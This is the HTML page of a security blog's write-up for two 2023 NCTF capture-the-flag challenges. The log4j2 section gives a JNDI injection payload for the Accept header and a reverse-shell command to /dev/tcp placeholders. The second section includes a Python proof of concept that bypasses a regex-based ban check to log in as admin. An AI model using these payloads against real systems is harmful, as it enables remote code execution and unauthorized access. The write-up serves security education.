@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="s3ven&#39;s blog" />
+  
+  
+  
+  <title>
+    
+      2023 NCTF WriteUp 
+      
+      
+      |
+    
+     s3ven&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">2023 NCTF WriteUp</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+          2023-12-24
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="../../categories/write-up/" title="Write Up">
+                    Write Up
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="../../tags/nodejs/" title="NodeJS">
+                    #NodeJS
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="../../tags/java/" title="Java">
+                    #Java
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h1><p><code>log4j2 rce (CVE-2021-44228)</code></p>
+<p>使用工具：</p>
+<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n&#x2F;JNDI-Injection-Exploit: JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc） (github.com)</a></p>
+<p>Server Bash run：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">"bash -c &#123;echo,x&#125;(x: 'bash -i >&amp; /dev/tcp/ip/port 0>&amp;1' encoded with base64)|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token parameter variable">-A</span> <span class="token operator">&lt;</span>server_ip<span class="token operator">></span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">></span></code></pre>
+<p>在 Request 的 Accept Header 中注入 jndi，触发报错日志记录，</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">$&#123;jndi:rmi://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rmi_port</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ramdom_rmi_route</span><span class="token punctuation">></span></span>&#125;</code></pre>
+<p>log4j2 远程加载 Class 类 反弹 Shell</p>
+<h1 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What"></a>Wait What</h1><blockquote>
+<p>写战队wp的时候写了个这题的抽象版wp，结果发现认错出题人了还被拿来当官方wp了，给 X1r0z 和 114 佬们跪了Orz，以下是正常版wp</p>
+</blockquote>
+<p>由于 admin 账号被放入了 waf 中<br>而我们又需要登录 admin 账号来获取 flag<br>因此本题的核心目标是绕过两道 waf 来登录 admin 账号获取 flag</p>
+<h2 id="1-正则-waf-绕过"><a href="#1-正则-waf-绕过" class="headerlink" title="1. 正则 waf 绕过"></a>1. 正则 waf 绕过</h2><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> test1 <span class="token operator">=</span> banned_users_regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">使用正则</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>banned_users_regex<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">匹配</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">的结果为：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>test1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>test1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"第一个判断匹配到封禁用户："</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"用户'"</span><span class="token operator">+</span>username <span class="token operator">+</span> <span class="token string">"'被封禁，无法鉴权！"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>由于 <code>new RegExp(regex_string, &quot;g&quot;)</code> 定义了 g 的全局 regex</p>
+<blockquote>
+<p>regex.test()：<br>如果正则表达式设置了全局标志，<code>test()</code> 的执行会改变正则表达式 <code>lastIndex</code>属性。<br>连续的执行<code>test()</code>方法，后续的执行将会从 lastIndex 处开始匹配字符串<br>example：</p>
+</blockquote>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">ar regex <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">foo</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
+<span class="token comment">// regex.lastIndex is at 0 </span>
+regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true </span>
+
+<span class="token comment">// regex.lastIndex is now at 3 </span>
+regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span></code></pre>
+<p>此处存在漏洞利用的可能，但在 <code>app.use()</code> 中:</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">build_banned_users_regex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）："</span><span class="token punctuation">,</span>banned_users_regex<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>
+<p><code>build_banned_users_regex()</code>：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">build_banned_users_regex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> regex_string <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> username <span class="token keyword">of</span> banned_users<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        regex_string <span class="token operator">+=</span> <span class="token string">"^"</span> <span class="token operator">+</span> <span class="token function">escapeRegExp</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$"</span> <span class="token operator">+</span> <span class="token string">"|"</span>
+    <span class="token punctuation">&#125;</span>
+    regex_string <span class="token operator">=</span> regex_string<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> regex_string<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    banned_users_regex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>regex_string<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p><code>escapeRegExp(username)</code>：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escapeRegExp</span><span class="token punctuation">(</span><span class="token parameter">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> string<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[.*+?^$&#123;&#125;()|[\]\\]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\$&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>这些代码会导致每次在请求时都会更新 banned_users_regex ，恢复其 lastIndex 位置<br>由于 try 和 catch 的存在，我们考虑 throw error 来绕过 regex 的更新</p>
+<p>通过构造传入 <code>escapeRegExp()</code>函数中的 string 为其他数据类型，</p>
+<p>可以使得 replace 属性报错，这样就可以绕过 regex 的更新</p>
+<h2 id="2-in-关键字-waf-绕过"><a href="#2-in-关键字-waf-绕过" class="headerlink" title="2. in 关键字 waf 绕过"></a>2. in 关键字 waf 绕过</h2><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> test2 <span class="token operator">=</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> banned_users<span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">使用in关键字匹配</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">的结果为：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>test2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>test2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"第二个判断匹配到封禁用户："</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"用户'"</span><span class="token operator">+</span>username <span class="token operator">+</span> <span class="token string">"'被封禁，无法鉴权！"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<blockquote>
+<p>JavaScript：in：如果指定的属性在指定的对象或其原型链中，则 <code>in</code> 运算符返回 <code>true</code></p>
+</blockquote>
+<p>由于 banned_users 为 <code>Array</code> 类型，不存在 admin 属性，<br>因此 test2 恒为 <code>false</code>，与 banned_users 的具体元素内容无关</p>
+<h2 id="3-解题步骤"><a href="#3-解题步骤" class="headerlink" title="3. 解题步骤"></a>3. 解题步骤</h2><ol>
+<li>利用 &#x2F;api&#x2F;ban_user 路由构造 ban_username 为 {} 等其他数据类型</li>
+<li>执行 &#x2F;api&#x2F;flag ，使得 regex 的 lastIndex 移至 admin 以后</li>
+<li>执行 &#x2F;api&#x2F;flag，成功绕过正则 waf，正则 waf 返回 false，获得 flag</li>
+</ol>
+<h2 id="4-Poc"><a href="#4-Poc" class="headerlink" title="4. Poc"></a>4. Poc</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+Base_url <span class="token operator">=</span> <span class="token string">"&lt;challenge_url>:&lt;port>"</span>
+
+<span class="token comment"># bypass regex regeneratation (throw error)</span>
+requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
+    <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>Base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/ban_user'</span></span><span class="token punctuation">,</span> 
+    json<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">,</span>
+        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">,</span>
+        <span class="token string">'ban_username'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[1/2] Successfully Bypassed Regex Regeneratation"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># using .test() twice and bypass regex</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
+        <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>Base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/flag'</span></span><span class="token punctuation">,</span> 
+        json<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>
+            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[2/2] Done! flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="../2023-%E5%BC%BA%E7%BD%91%E6%9D%AFs7-writeup/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="../../skill/xml-cdata-xxe/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#logging"><span class="toc-text">logging</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Wait-What"><span class="toc-text">Wait What</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%AD%A3%E5%88%99-waf-%E7%BB%95%E8%BF%87"><span class="toc-text">1. 正则 waf 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-in-%E5%85%B3%E9%94%AE%E5%AD%97-waf-%E7%BB%95%E8%BF%87"><span class="toc-text">2. in 关键字 waf 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-text">3. 解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Poc"><span class="toc-text">4. Poc</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2025 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
